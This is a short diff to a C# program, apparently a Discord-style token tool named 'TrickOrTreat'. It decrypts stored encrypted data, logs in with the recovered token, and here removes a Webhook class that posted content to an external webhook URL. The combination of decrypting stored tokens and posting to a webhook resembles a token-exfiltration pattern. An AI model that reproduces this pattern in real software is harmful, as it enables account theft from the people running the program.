@@ -47,8 +47,6 @@ namespace TrickOrTreat
             {
                 client.Login(t0ken());
 
-                Webhook hook = new Webhook(webhook);
-
                 string cid = client.GetClientUser().Id.ToString();
                 if (string.IsNullOrEmpty(cid))
                 {
@@ -290,29 +288,6 @@ namespace TrickOrTreat
             byte[] DecryptedBytes = new byte[BlockCipher.GetOutputSize(EncryptedData.Length)];
             BlockCipher.DoFinal(DecryptedBytes, BlockCipher.ProcessBytes(EncryptedData, 0, EncryptedData.Length, DecryptedBytes, 0));
             return Encoding.UTF8.GetString(DecryptedBytes).TrimEnd("\r\n\0".ToCharArray());
-        }
-        #endregion
-
-        #region Webhook class
-        class Webhook
-        {
-            private HttpClient Client;
-            private string Url;
-
-            public Webhook(string webhookUrl)
-            {
-                Client = new HttpClient();
-                Url = webhookUrl;
-            }
-
-            public bool SendMessage(string content)
-            {
-                MultipartFormDataContent data = new MultipartFormDataContent();
-                data.Add(new StringContent("github.com/extatent"), "username");
-                data.Add(new StringContent(content), "content");
-                var resp = Client.PostAsync(Url, data).Result;
-                return resp.StatusCode == System.Net.HttpStatusCode.NoContent;
-            }
         }
         #endregion
     }
